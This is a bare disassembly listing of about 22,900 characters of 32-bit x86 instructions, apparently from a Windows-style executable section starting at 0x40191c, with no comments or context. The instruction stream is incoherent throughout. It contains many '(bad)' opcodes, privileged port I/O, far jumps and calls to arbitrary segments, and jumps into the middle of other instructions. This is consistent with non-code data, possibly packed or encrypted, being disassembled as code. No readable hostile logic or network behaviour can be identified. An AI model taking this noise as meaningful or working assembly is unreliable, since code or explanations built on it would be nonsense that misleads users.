  40191c:	sub    DWORD PTR [edx],edi
  40191e:	repnz fstp TBYTE PTR [ecx]
  401921:	fmul   DWORD PTR [ebx+0x39b63bea]
  401927:	mov    bh,0xb7
  401929:	fisubr WORD PTR [edx+0x2e897331]
  40192f:	in     al,0x8
  401931:	dec    edx
  401932:	shl    BYTE PTR [ecx],cl
  401934:	dec    edx
  401935:	cdq    
  401936:	xchg   ebp,eax
  401937:	jl     0x40193a
  401939:	test   al,0xf5
  40193b:	push   ss
  40193c:	leave  
  40193d:	test   al,0x81
  40193f:	mov    BYTE PTR fs:[edx+0x61],ah
  401943:	rcr    BYTE PTR [eax-0x57],cl
  401946:	adc    al,BYTE PTR [ecx]
  401948:	sub    esi,DWORD PTR [ecx-0x12594223]
  40194e:	in     al,0x8c
  401950:	inc    edi
  401951:	fmul   st(2),st
  401953:	inc    eax
  401954:	sti    
  401955:	fld    TBYTE PTR [eax-0x1b]
  401958:	push   esp
  401959:	das    
  40195a:	and    al,0xc8
  40195c:	stos   BYTE PTR es:[edi],al
  40195d:	sbb    eax,0xf6ff1340
  401962:	int3   
  401963:	sbb    eax,0x9b3f534d
  401968:	cmp    al,0xc7
  40196a:	ins    DWORD PTR es:[edi],dx
  40196b:	dec    ebp
  40196c:	pop    es
  40196d:	mov    esp,0xb8fc4adf
  401972:	mov    cl,0xe3
  401974:	or     al,0x79
  401976:	jmp    0x4019f4
  401978:	sub    BYTE PTR [ebp+esi*1+0xecb4182],cl
  40197f:	aam    0xb6
  401981:	test   BYTE PTR [esi],dl
  401983:	fild   WORD PTR [ebx-0xb]
  401986:	mov    ebp,0xc6319f01
  40198b:	mov    WORD PTR [ebx-0x1f8f7bf2],fs
  401991:	pop    eax
  401992:	mov    dh,0xa4
  401994:	jge    0x401946
  401996:	shl    BYTE PTR [edi+0x6d562dbe],cl
  40199c:	outs   dx,BYTE PTR ds:[esi]
  40199d:	call   0x57d2e0b9
  4019a2:	pop    edi
  4019a3:	mov    DWORD PTR [eax-0x5f],0x6900b005
  4019aa:	push   0xb704f03
  4019af:	cmc    
  4019b0:	outs   dx,BYTE PTR ds:[esi]
  4019b1:	(bad)  
  4019b2:	int    0xbe
  4019b4:	fidiv  WORD PTR [edx-0x4746c323]
  4019ba:	addr16 mov al,ds:0xa71d
  4019be:	outs   dx,BYTE PTR ds:[esi]
  4019bf:	jp     0x401957
  4019c1:	stc    
  4019c2:	test   BYTE PTR [esi],dh
  4019c4:	repz scas eax,DWORD PTR es:[edi]
  4019c6:	jmp    DWORD PTR [ecx+edx*4-0x52]
  4019ca:	jl     0x4019aa
  4019cc:	imul   esp,edx,0x60abd082
  4019d2:	jne    0x401984
  4019d4:	inc    ebx
  4019d5:	mov    ds:0xde08a34f,al
  4019da:	xchg   ebp,eax
  4019db:	xchg   edx,eax
  4019dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019dd:	lods   al,BYTE PTR ds:[esi]
  4019de:	xchg   DWORD PTR [esi],ebx
  4019e0:	push   edx
  4019e1:	lods   al,BYTE PTR ds:[esi]
  4019e2:	xor    ah,bl
  4019e4:	xchg   ebx,eax
  4019e5:	fs pusha 
  4019e7:	fistp  WORD PTR [edi-0x78]
  4019ea:	jbe    0x401a1b
  4019ec:	pop    edi
  4019ed:	push   0xffffffc6
  4019ef:	jl     0x401991
  4019f1:	push   edi
  4019f2:	jno    0x401a48
  4019f4:	inc    ecx
  4019f5:	imul   eax,DWORD PTR [ebx-0x5b88c472],0x6168d2af
  4019ff:	mov    ds:0xc238571c,eax
  401a04:	jae    0x4019f4
  401a06:	and    eax,0x98d0c98e
  401a0b:	cmp    cl,BYTE PTR ds:0x375f43c4
  401a11:	int3   
  401a12:	inc    esp
  401a13:	cli    
  401a14:	lods   eax,DWORD PTR ds:[esi]
  401a15:	loope  0x4019ad
  401a17:	popa   
  401a18:	and    DWORD PTR [ecx],edi
  401a1a:	mov    edx,ebp
  401a1c:	xor    ebx,DWORD PTR [eax-0x13e201fa]
  401a22:	sub    DWORD PTR [eax-0x14],edx
  401a25:	push   ecx
  401a26:	pop    esp
  401a27:	rcl    DWORD PTR [ebp+eiz*2-0x7a],1
  401a2b:	mov    ds:0xa04e9b,eax
  401a30:	pop    ss
  401a31:	cwde   
  401a32:	sbb    BYTE PTR [edi-0x5],0xc7
  401a36:	vpaddq xmm4,xmm5,XMMWORD PTR [ecx+0x1a]
  401a3b:	int3   
  401a3c:	fld    st(4)
  401a3e:	xor    al,0xb3
  401a40:	push   ds
  401a41:	sbb    al,0x22
  401a43:	data16 jns 0x401a6e
  401a46:	ja     0x401a35
  401a48:	mov    ds:0x4873b8b7,eax
  401a4d:	xchg   BYTE PTR [edx+0x1f],dh
  401a50:	mov    eax,ds:0x4d895ae9
  401a55:	jp     0x4019f0
  401a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a58:	stos   DWORD PTR es:[edi],eax
  401a59:	cmp    DWORD PTR [ecx],0x3d2a1627
  401a5f:	adc    ebp,ecx
  401a61:	rcl    BYTE PTR [edi+0x8759c08],cl
  401a67:	arpl   WORD PTR [ecx+0x46],si
  401a6a:	mov    WORD PTR [ebx+0x23],ds
  401a6d:	cmp    ebp,ebx
  401a6f:	jmp    0x401a59
  401a71:	mov    WORD PTR [eax-0x12598662],ss
  401a77:	pop    es
  401a78:	jae    0x401a0c
  401a7a:	or     eax,0xb0ca7a22
  401a7f:	aad    0x46
  401a81:	push   edi
  401a82:	add    al,0x94
  401a85:	fldl2t 
  401a87:	push   ds
  401a88:	jmp    0xbfa25baa
  401a8d:	stc    
  401a8e:	pop    ebx
  401a8f:	pop    esi
  401a90:	dec    edx
  401a91:	lods   ax,WORD PTR ds:[esi]
  401a93:	test   al,0x49
  401a95:	dec    ecx
  401a96:	lahf   
  401a97:	dec    edx
  401a98:	xlat   BYTE PTR ds:[ebx]
  401a99:	dec    edi
  401a9a:	jo     0x401b0e
  401a9c:	push   eax
  401a9d:	pop    ss
  401a9e:	aas    
  401a9f:	iret   
  401aa0:	pop    es
  401aa1:	fs dec edi
  401aa3:	mov    ebp,0x2ded2dcc
  401aa8:	mov    edx,0xb0162ce
  401aad:	xchg   DWORD PTR [edx-0x59],ebx
  401ab0:	icebp  
  401ab1:	retf   
  401ab2:	stc    
  401ab3:	pop    edx
  401ab4:	and    DWORD PTR [ebx-0x1f4ccf29],ecx
  401aba:	mov    al,ds:0x5a0bac66
  401abf:	mov    dh,0x2f
  401ac1:	sti    
  401ac2:	and    BYTE PTR [edi+0x676de083],bh
  401ac8:	sub    BYTE PTR [esi+0x5a],ah
  401acb:	fild   WORD PTR [eax]
  401acd:	sub    al,0x51
  401acf:	sbb    bl,bh
  401ad1:	or     al,0x38
  401ad3:	dec    ebx
  401ad4:	cld    
  401ad5:	inc    edi
  401ad6:	pop    esi
  401ad7:	dec    edi
  401ad8:	and    BYTE PTR [edi],0xc2
  401adb:	stos   BYTE PTR es:[edi],al
  401adc:	retf   0x2dbb
  401adf:	jno    0x401adc
  401ae1:	push   esp
  401ae2:	out    dx,al
  401ae3:	ret    0x341b
  401ae6:	pop    es
  401ae7:	lods   eax,DWORD PTR ds:[esi]
  401ae8:	cdq    
  401ae9:	add    DWORD PTR [edx],eax
  401aeb:	dec    edx
  401aec:	push   es
  401aed:	ret    
  401aee:	push   ebp
  401aef:	mov    cl,0xb2
  401af1:	and    dl,BYTE PTR [ebp-0x5c]
  401af4:	sti    
  401af5:	das    
  401af6:	mov    al,ds:0xab8da989
  401afb:	xchg   esp,eax
  401afc:	(bad)  
  401afd:	xchg   ebp,eax
  401afe:	call   0xee62c2b5
  401b03:	neg    DWORD PTR [edx]
  401b05:	mov    eax,0x2d9a9abc
  401b0a:	and    DWORD PTR [ecx],ebx
  401b0c:	(bad)  
  401b0e:	aam    0x71
  401b10:	xor    eax,0xbd3e36ae
  401b15:	dec    ebp
  401b16:	mov    al,cs:0x6870e21b
  401b1c:	out    dx,eax
  401b1d:	xchg   edi,ebx
  401b1f:	mov    esi,0x40ca327b
  401b24:	inc    eax
  401b25:	xor    ch,cl
  401b27:	or     edi,0xffffffdd
  401b2a:	or     DWORD PTR [ebx],edi
  401b2c:	xchg   ecx,eax
  401b2d:	ret    
  401b2e:	push   ebx
  401b2f:	add    eax,eax
  401b31:	shr    DWORD PTR [eax+0x77],1
  401b34:	mov    dh,0xcf
  401b36:	inc    eax
  401b37:	adc    dh,BYTE PTR [ecx-0x799887a0]
  401b3d:	cmp    ch,bl
  401b3f:	mov    ah,0x44
  401b41:	cmp    dh,BYTE PTR [eax-0x5340807e]
  401b47:	arpl   bp,bp
  401b49:	push   esi
  401b4a:	out    0xd4,eax
  401b4c:	mov    eax,ds:0xb18f2d31
  401b51:	inc    ebp
  401b52:	inc    esp
  401b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b54:	add    BYTE PTR [eax-0x70],0xec
  401b58:	test   DWORD PTR [edi-0x768fa2b9],esi
  401b5e:	adc    al,0x1f
  401b60:	icebp  
  401b61:	add    ecx,ecx
  401b63:	pop    DWORD PTR [eax-0x7b5dd47b]
  401b69:	mov    edx,DWORD PTR [eax]
  401b6b:	mov    DWORD PTR [edx+0x71da4984],ebp
  401b71:	push   0x7f
  401b73:	jbe    0x401b81
  401b75:	sbb    eax,0xe2ad04a8
  401b7a:	stos   DWORD PTR es:[edi],eax
  401b7b:	mov    ecx,0x30ed63eb
  401b80:	mov    ebx,edi
  401b82:	int    0x5a
  401b84:	sbb    DWORD PTR [edi+0x1d],edi
  401b87:	pop    esp
  401b88:	xor    al,0x75
  401b8a:	retf   0x76d3
  401b8d:	add    dl,dh
  401b8f:	sbb    BYTE PTR ss:[edx],ch
  401b92:	or     eax,0xa062c965
  401b97:	int3   
  401b98:	mov    edx,0x98287e8c
  401b9d:	les    ecx,FWORD PTR [esi]
  401b9f:	aam    0x14
  401ba1:	shr    al,1
  401ba3:	out    0x8b,al
  401ba5:	popf   
  401ba6:	jl     0x401bce
  401ba8:	jns    0x401bed
  401baa:	sub    eax,DWORD PTR [ebp+0x2ff4ffed]
  401bb0:	js     0x401b96
  401bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb3:	mov    ebp,DWORD PTR [ebp-0x27]
  401bb6:	scas   eax,DWORD PTR es:[edi]
  401bb7:	popf   
  401bb8:	jb     0x401bc8
  401bba:	adc    dl,BYTE PTR [edi]
  401bbc:	arpl   WORD PTR [ebx-0x74e56129],dx
  401bc2:	cwde   
  401bc3:	mov    ds:0xb1ca885b,al
  401bc8:	jns    0x401c0a
  401bca:	mov    ss,ebp
  401bcc:	mov    edx,0x82f8f655
  401bd1:	ret    
  401bd2:	pushf  
  401bd3:	or     al,0xbf
  401bd5:	add    eax,0xef92e6e1
  401bda:	xchg   ebp,eax
  401bdb:	jae    0x401bc7
  401bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bde:	stos   BYTE PTR es:[edi],al
  401bdf:	cmp    al,0x99
  401be1:	(bad)  
  401be2:	xchg   ebp,eax
  401be3:	pop    ebp
  401be4:	out    0x52,eax
  401be6:	push   edi
  401be7:	sub    dh,BYTE PTR [esi+0x7631674d]
  401bed:	adc    al,0xe5
  401bef:	fnstenv [ebx]
  401bf1:	dec    ecx
  401bf2:	data16 jl 0x401b9a
  401bf5:	sub    DWORD PTR [esi],0xa22343c4
  401bfb:	test   eax,0x909cc515
  401c00:	popa   
  401c01:	xlat   BYTE PTR ds:[ebx]
  401c02:	mov    dh,0xbe
  401c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c05:	add    ah,al
  401c07:	das    
  401c08:	pop    ebp
  401c09:	aad    0xd5
  401c0b:	les    esi,FWORD PTR [eax-0x40]
  401c0e:	out    dx,eax
  401c0f:	sub    bl,BYTE PTR [esi+0x1ff6fb1f]
  401c15:	xchg   ebx,eax
  401c16:	aaa    
  401c17:	xchg   ecx,eax
  401c18:	enter  0x5e9c,0x8e
  401c1c:	(bad)  
  401c1d:	lods   al,BYTE PTR ss:[esi]
  401c1f:	fsubr  QWORD PTR [edi-0x6b229dbb]
  401c25:	nop
  401c26:	test   DWORD PTR [edx],0x3a88b68d
  401c2c:	js     0x401c24
  401c2e:	mov    edi,0x7269bfa3
  401c33:	fcom   DWORD PTR [eax+0x1c3b89ae]
  401c39:	test   al,0x53
  401c3b:	bnd jl 0x401c5d
  401c3e:	in     al,dx
  401c3f:	imul   ebp,esp,0x31
  401c42:	out    dx,al
  401c43:	shl    esp,cl
  401c45:	mov    ebx,0xdfdca6ee
  401c4a:	jnp    0x401c4c
  401c4c:	add    eax,0xcfa58a1b
  401c51:	or     BYTE PTR [ebx+0x58],dl
  401c54:	and    bl,BYTE PTR [esi]
  401c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c57:	daa    
  401c58:	sbb    BYTE PTR [ecx-0x2a],bl
  401c5b:	mov    edi,ds
  401c5d:	daa    
  401c5e:	das    
  401c5f:	aaa    
  401c60:	pusha  
  401c61:	jb     0x401cde
  401c63:	imul   edx,eax,0x38
  401c66:	or     cl,ah
  401c68:	mov    ebx,0xb4198a77
  401c6d:	xchg   DWORD PTR [ebp-0x19d9cc1c],ecx
  401c73:	lods   eax,DWORD PTR ds:[esi]
  401c74:	in     eax,0x70
  401c76:	jmp    0x401c40
  401c78:	aaa    
  401c79:	cmp    bh,cl
  401c7b:	or     al,0x4d
  401c7d:	pop    esi
  401c7e:	jl     0x401c3e
  401c80:	sbb    eax,0x7caa32cb
  401c85:	stos   BYTE PTR es:[edi],al
  401c86:	jbe    0x401caa
  401c88:	repnz add ch,bl
  401c8b:	dec    esi
  401c8c:	int    0x17
  401c8e:	repz add bl,BYTE PTR [edi-0x4]
  401c92:	outs   dx,BYTE PTR ds:[esi]
  401c93:	cld    
  401c94:	(bad)  
  401c95:	int3   
  401c96:	and    al,0x71
  401c98:	(bad)  
  401c99:	clc    
  401c9a:	mov    ebx,0xc8cc9009
  401c9f:	mov    ch,0xbc
  401ca1:	cmp    esp,DWORD PTR [edi-0x10]
  401ca4:	in     eax,dx
  401ca5:	aaa    
  401ca6:	inc    eax
  401ca7:	cdq    
  401ca8:	nop
  401ca9:	sbb    dl,BYTE PTR [ecx+0x28]
  401cac:	adc    DWORD PTR [eax+0x27],0xffffffd7
  401cb0:	xchg   DWORD PTR [esp+ebx*1],ebp
  401cb3:	ret    0xc82e
  401cb6:	push   DWORD PTR [ebx+esi*8+0x76]
  401cba:	mov    esi,0x4e29de84
  401cbf:	and    BYTE PTR [ebp-0x51bf0560],bh
  401cc5:	xchg   esi,eax
  401cc6:	out    dx,eax
  401cc7:	cmp    BYTE PTR [ebx],0x2f
  401cca:	jmp    0x1989274f
  401ccf:	add    DWORD PTR [ecx-0x6a877890],esi
  401cd5:	xchg   esi,eax
  401cd6:	shl    DWORD PTR [ebx-0x56],1
  401cd9:	mov    WORD PTR [edi-0x6e],ds
  401cdc:	stos   BYTE PTR es:[edi],al
  401cdd:	addr16 and ecx,eax
  401ce0:	test   al,al
  401ce2:	jecxz  0x401cec
  401ce4:	popa   
  401ce5:	add    edi,ecx
  401ce7:	enter  0x20f3,0x5e
  401ceb:	and    ebx,DWORD PTR [eax+ecx*2-0x74]
  401cef:	mov    bh,0x18
  401cf1:	cmp    dl,BYTE PTR [ecx]
  401cf3:	and    BYTE PTR [ecx-0x76fd9185],cl
  401cf9:	out    dx,eax
  401cfa:	bound  ebp,QWORD PTR ss:[ecx+eax*2-0x70beae43]
  401d02:	mov    ch,0x57
  401d04:	imul   ebx,DWORD PTR ds:0x79bc12b1,0xbddfe41
  401d0e:	(bad)  
  401d0f:	stos   DWORD PTR es:[edi],eax
  401d10:	nop
  401d11:	pop    es
  401d12:	push   edx
  401d13:	(bad)
  401d17:	mov    edi,0xad6000f6
  401d1c:	call   0xeb64cd59
  401d21:	cmp    eax,0x8e2727c2
  401d26:	fdivr  QWORD PTR [ebx]
  401d28:	dec    eax
  401d29:	enter  0x16a1,0x2
  401d2d:	mov    bl,BYTE PTR [ebp+0xa]
  401d30:	cwde   
  401d31:	sub    edi,0x53efa5e0
  401d37:	jecxz  0x401d14
  401d39:	cmp    BYTE PTR [eax+eax*4+0x6941b47c],al
  401d40:	sbb    ebp,DWORD PTR [eax]
  401d42:	les    esp,FWORD PTR [ebx+0x884bce5]
  401d48:	jbe    0x401db5
  401d4a:	aad    0x42
  401d4c:	sub    eax,0x938277bb
  401d51:	push   es
  401d52:	mov    cl,0x67
  401d54:	jecxz  0x401d24
  401d56:	or     DWORD PTR [edi-0x71ead63e],ebx
  401d5c:	add    eax,0x91f68e88
  401d61:	repz xor eax,0x8cbf8ce2
  401d67:	test   al,0x8e
  401d69:	loop   0x401ddf
  401d6b:	js     0x401dbb
  401d6d:	not    eax
  401d6f:	inc    esp
  401d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d71:	loopne 0x401d97
  401d73:	adc    ecx,eax
  401d75:	mov    cl,0x9b
  401d77:	sub    eax,DWORD PTR ds:0x76f9c0ec
  401d7d:	or     ecx,DWORD PTR [ecx]
  401d7f:	cmp    eax,0x48e72c7b
  401d84:	fs pop esi
  401d86:	add    DWORD PTR [edi],ecx
  401d88:	jnp    0x401dae
  401d8a:	cmp    BYTE PTR [eax-0x6f],dl
  401d8d:	sbb    bl,BYTE PTR [ebx]
  401d8f:	add    BYTE PTR [ebx+0x61],ah
  401d92:	aam    0x7c
  401d94:	jmp    0x2767:0xb757371
  401d9b:	js     0x401dc1
  401d9d:	push   0x7900239b
  401da2:	jge    0x401dbd
  401da4:	inc    eax
  401da5:	or     al,ah
  401da7:	test   DWORD PTR [edx-0x331523c7],0xb40bf375
  401db1:	pop    edx
  401db2:	jg     0x401d51
  401db4:	jp     0x401dcb
  401db6:	xlat   BYTE PTR ds:[ebx]
  401db7:	loop   0x401dfd
  401db9:	mov    ds:0xeb42a97a,eax
  401dbe:	xor    DWORD PTR [eax],ebp
  401dc0:	int    0x4d
  401dc2:	in     al,0x47
  401dc4:	sub    al,0x23
  401dc6:	push   edi
  401dc7:	jmp    0xfd6d648a
  401dcc:	and    edi,edx
  401dce:	adc    ebx,DWORD PTR [edx+eiz*2+0x23]
  401dd2:	aas    
  401dd3:	xchg   eax,esi
  401dd5:	into   
  401dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dd7:	add    DWORD PTR [esi],esp
  401dd9:	stos   BYTE PTR es:[edi],al
  401dda:	pusha  
  401ddb:	xlat   BYTE PTR ds:[ebx]
  401ddc:	ins    BYTE PTR es:[edi],dx
  401ddd:	pop    ecx
  401dde:	cdq    
  401ddf:	xchg   ecx,eax
  401de0:	int3   
  401de1:	jmp    0x401ddf
  401de3:	jne    0x401e5e
  401de5:	aad    0xfd
  401de7:	inc    edi
  401de8:	fisttp QWORD PTR [eax-0x4519dbcc]
  401dee:	mov    ds:0xdb3452ff,al
  401df3:	push   esp
  401df4:	enter  0xba1b,0x34
  401df8:	rcr    esi,cl
  401dfa:	push   esp
  401dfb:	xor    sp,WORD PTR [edi+ebx*1]
  401dff:	loope  0x401e44
  401e01:	(bad)  
  401e02:	jp     0x401df6
  401e04:	jg     0x401da4
  401e06:	imul   ebx,DWORD PTR [edi],0x7254975e
  401e0c:	sar    BYTE PTR [ecx],1
  401e0e:	push   0x7e
  401e10:	xor    al,0x9a
  401e12:	les    edx,FWORD PTR [ebp-0x54]
  401e15:	jo     0x401d9a
  401e17:	in     al,dx
  401e18:	xor    eax,0x274dcc43
  401e1d:	test   BYTE PTR [ebp-0x1c],al
  401e20:	(bad)  
  401e21:	repz mov edx,0x382b0e40
  401e27:	add    al,0xf7
  401e29:	mov    dl,BYTE PTR [ecx+0x9b5af64]
  401e2f:	sahf   
  401e30:	adc    eax,0x20
  401e33:	ficomp DWORD PTR [eax+0x31]
  401e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e37:	pop    ds
  401e38:	cmc    
  401e39:	fisttp DWORD PTR [ebx]
  401e3b:	repnz add eax,0xac70cfac
  401e41:	inc    DWORD PTR [edx-0x48]
  401e44:	ins    DWORD PTR es:[edi],dx
  401e45:	inc    ebx
  401e46:	push   es
  401e47:	mov    ah,BYTE PTR [edi]
  401e49:	xchg   al,dh
  401e4b:	test   al,0xaa
  401e4d:	inc    ebx
  401e4e:	cmp    esi,eax
  401e50:	call   FWORD PTR [eax-0x8ac36a2]
  401e56:	sar    BYTE PTR [ecx],0x86
  401e59:	pop    ebp
  401e5a:	add    BYTE PTR [edx-0xd4b1a50],bl
  401e60:	jbe    0x401e8c
  401e62:	jbe    0x401e49
  401e64:	fimul  DWORD PTR [eax+0x31]
  401e67:	jl     0x401dec
  401e69:	inc    edx
  401e6a:	loopne 0x401e06
  401e6c:	sbb    eax,0x219aaca2
  401e71:	add    bh,dl
  401e73:	ds xchg esi,eax
  401e75:	ret    0x8463
  401e78:	xchg   esp,eax
  401e79:	mov    al,ds:0x611b544b
  401e7e:	test   BYTE PTR [edx-0x62],ah
  401e81:	push   esi
  401e82:	inc    edx
  401e83:	leave  
  401e84:	jne    0x401eb4
  401e86:	inc    ebx
  401e87:	add    BYTE PTR ds:0x1674f8d2,0x36
  401e8e:	sub    DWORD PTR [ebx-0x41],edi
  401e91:	int    0xf6
  401e93:	lods   al,BYTE PTR ds:[esi]
  401e94:	mov    al,0x17
  401e96:	sbb    eax,0xd18719ed
  401e9b:	cmp    ch,al
  401e9d:	daa    
  401e9e:	ret    0x8bdf
  401ea1:	mov    ecx,0x1644c2e6
  401ea6:	xor    dh,BYTE PTR [eax+0x4]
  401ea9:	or     DWORD PTR [edi-0x3f],esp
  401eac:	add    dl,BYTE PTR [eax]
  401eae:	xchg   DWORD PTR [edi-0x2],ebp
  401eb1:	call   0x6865:0xa02ecae0
  401eb8:	cwde   
  401eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eba:	lea    eax,[ebx+0x46088b1b]
  401ec0:	stc    
  401ec1:	xchg   ebx,eax
  401ec2:	and    ah,ch
  401ec4:	adc    ecx,DWORD PTR [eax+0x53e42cf1]
  401eca:	jns    0x401e6b
  401ecc:	jns    0x401ea5
  401ece:	cmp    al,0xd3
  401ed0:	push   esi
  401ed1:	or     bh,dh
  401ed3:	mov    eax,ds:0xe69f446d
  401ed8:	and    DWORD PTR [ebx+0x50593d2e],eax
  401ede:	add    bh,BYTE PTR [esi-0x645474c5]
  401ee4:	add    DWORD PTR [edx-0x117f642d],ebx
  401eea:	push   eax
  401eeb:	enter  0x17cf,0xe8
  401eef:	add    al,0xab
  401ef1:	fild   QWORD PTR [esi-0x65]
  401ef4:	les    ebp,FWORD PTR [ebx]
  401ef6:	dec    ebp
  401ef7:	jl     0x401e7e
  401ef9:	out    dx,eax
  401efa:	aad    0x9e
  401efc:	mov    esi,0x15b65fad
  401f01:	mov    eax,edi
  401f03:	fld    DWORD PTR [eax+0x23]
  401f06:	test   BYTE PTR [esi+0x56],dh
  401f09:	sti    
  401f0a:	cs jo  0x401f6b
  401f0d:	sbb    BYTE PTR [esi],al
  401f0f:	cmp    eax,0xc07a48b4
  401f14:	rcl    ebp,cl
  401f16:	sti    
  401f17:	cmp    esp,ebp
  401f19:	push   0xdc7bd3f
  401f1e:	test   al,0x5e
  401f20:	aad    0xbf
  401f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f23:	(bad)  
  401f24:	lds    ebp,FWORD PTR [eax+0x9]
  401f27:	sbb    bl,bl
  401f29:	out    0x6d,al
  401f2b:	fcomip st,st(2)
  401f2d:	iret   
  401f2e:	aaa    
  401f2f:	cli    
  401f30:	pop    ebp
  401f31:	add    eax,0x3178023
  401f36:	iret   
  401f37:	icebp  
  401f38:	(bad)  
  401f39:	mov    edx,0x61d6dd71
  401f3e:	loopne 0x401edd
  401f40:	fadd   QWORD PTR [ebx]
  401f42:	jo     0x401f35
  401f44:	mov    bl,0xaa
  401f46:	lods   eax,DWORD PTR ds:[esi]
  401f47:	xchg   esp,eax
  401f48:	arpl   si,sp
  401f4a:	test   BYTE PTR [ecx+0xe],dl
  401f4d:	fiadd  WORD PTR [ebp+0x3b]
  401f50:	bound  edx,QWORD PTR [eax-0x77]
  401f53:	jmp    0x401f92
  401f55:	repz and esp,0x5ee92cb6
  401f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f5d:	in     eax,0xf5
  401f5f:	or     cl,BYTE PTR [edx+0x2d]
  401f62:	dec    edi
  401f63:	das    
  401f64:	fwait
  401f65:	push   esp
  401f66:	mov    cs,WORD PTR [eax]
  401f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f69:	mov    bh,0x9a
  401f6b:	adc    BYTE PTR [edx+ebx*8+0x14],0x72
  401f70:	jo     0x401f50
  401f72:	call   0x84e6:0xcebd372e
  401f79:	or     DWORD PTR [ecx-0x7dee619a],eax
  401f7f:	add    BYTE PTR [esi-0x6e16810b],ch
  401f85:	add    ebp,DWORD PTR [ebx-0x20]
  401f88:	xchg   ecx,eax
  401f89:	iret   
  401f8a:	into   
  401f8b:	cdq    
  401f8c:	add    al,BYTE PTR [edx+0x66]
  401f8f:	push   esi
  401f90:	xchg   edx,eax
  401f91:	xchg   esp,eax
  401f92:	pusha  
  401f93:	icebp  
  401f94:	pusha  
  401f95:	sahf   
  401f96:	mov    dl,0x5a
  401f98:	sbb    eax,0x269c940e
  401f9d:	xor    esp,DWORD PTR [eax+0x7d]
  401fa0:	fs or  al,0x8a
  401fa3:	adc    al,0xdc
  401fa5:	or     bh,dl
  401fa7:	test   BYTE PTR ds:0xa4029fb8,ch
  401fad:	mov    eax,0x30b674af
  401fb2:	inc    esp
  401fb3:	cmp    al,BYTE PTR ds:0x9a6c1dee
  401fb9:	mov    ecx,DWORD PTR [ebx+0x1a4dd7c0]
  401fbf:	jp     0x401ff2
  401fc1:	mov    ds:0x91ec5d06,al
  401fc6:	pop    esp
  401fc7:	jnp    0x401f51
  401fc9:	push   esp
  401fca:	lds    esi,FWORD PTR [esi-0x6c]
  401fcd:	mov    al,ds:0x1a336390
  401fd2:	ret    0x725f
  401fd5:	or     BYTE PTR [esi],bh
  401fd7:	xor    eax,0xe2f9e6b9
  401fdc:	ds jbe 0x40200f
  401fdf:	adc    BYTE PTR [esi+0x5ccdf7fe],dh
  401fe5:	scas   eax,DWORD PTR es:[edi]
  401fe6:	scas   eax,DWORD PTR es:[edi]
  401fe7:	mov    edi,0xaec0fa27
  401fec:	push   edx
  401fed:	out    dx,eax
  401fee:	cmp    al,0x9c
  401ff0:	jno    0x402009
  401ff2:	addr16 addr16 cmp al,0x13
  401ff6:	xchg   ebp,eax
  401ff7:	fnstenv gs:[eax]
  401ffa:	(bad)  
  401ffb:	cmp    DWORD PTR [edx-0x449d5752],esi
  402001:	lds    ebp,FWORD PTR [ecx]
  402003:	in     eax,dx
  402004:	cmp    eax,0x22889a47
  402009:	mov    esp,DWORD PTR [ecx+0x517ca158]
  40200f:	call   0x89c90884
  402014:	cmp    eax,0x3b6e8273
  402019:	aas    
  40201a:	aaa    
  40201b:	cld    
  40201c:	inc    esp
  40201d:	xlat   BYTE PTR ds:[ebx]
  40201e:	repz sti 
  402020:	mov    edx,DWORD PTR ds:0xa625bff8
  402026:	and    DWORD PTR [edi+0xd],ecx
  402029:	or     DWORD PTR [ecx-0x6e],ebp
  40202c:	push   cs
  40202d:	and    dh,bh
  40202f:	push   ecx
  402030:	ror    BYTE PTR [esi],0xd6
  402033:	cmp    edx,DWORD PTR [ecx+0x1b]
  402036:	repnz repnz adc ah,BYTE PTR [esi]
  40203a:	mov    ebx,0xa6befe8a
  40203f:	cwde   
  402040:	inc    edx
  402041:	loop   0x402060
  402043:	sti    
  402044:	adc    ah,cl
  402046:	repz dec ecx
  402048:	(bad)  
  402049:	das    
  40204a:	push   esi
  40204b:	out    dx,al
  40204c:	cmp    al,0x15
  40204e:	mov    bh,0x9e
  402050:	mov    eax,0x8f520c0
  402055:	(bad)  
  402056:	jmp    0x5908:0x7d3fc5b9
  40205d:	test   BYTE PTR [ebp+0x4a],ch
  402060:	repz xchg ebx,eax
  402062:	mov    al,ds:0x827521c7
  402067:	cmc    
  402068:	rol    BYTE PTR [esi],0x90
  40206b:	mov    ebx,0xcee95991
  402070:	pop    edx
  402071:	or     al,0x34
  402073:	xchg   BYTE PTR [esi+0x584ecd9e],ah
  402079:	jp     0x4020c7
  40207b:	ss pusha 
  40207d:	pop    esi
  40207e:	and    bh,BYTE PTR [esi+0x1574dcea]
  402084:	bound  edi,QWORD PTR [ebp+0x17]
  402087:	repz fistp WORD PTR [esi-0x4e]
  40208b:	aad    0x2f
  40208d:	adc    al,0xf5
  40208f:	ds sbb eax,0x22e86e6a
  402095:	stos   BYTE PTR es:[edi],al
  402096:	pop    edx
  402097:	lahf   
  402098:	lds    edx,FWORD PTR [esi+esi*1-0x50fb84e9]
  40209f:	or     BYTE PTR [edx],ah
  4020a1:	jns    0x402110
  4020a3:	dec    ecx
  4020a4:	xchg   ebx,eax
  4020a5:	mov    ebp,0x88e48621
  4020aa:	xchg   edi,eax
  4020ab:	ja     0x4020d2
  4020ad:	xchg   ecx,eax
  4020ae:	fstp   TBYTE PTR [ebx]
  4020b0:	jae    0x402080
  4020b2:	jmp    0xcc9ff0a2
  4020b7:	push   edx
  4020b8:	add    BYTE PTR [ecx],ah
  4020ba:	adc    al,0xda
  4020bc:	add    DWORD PTR [esp+ebp*1+0x59],esp
  4020c0:	imul   edx,DWORD PTR [esi],0xfffffff0
  4020c3:	lds    esi,FWORD PTR [eax+ebp*8-0xd]
  4020c7:	popa   
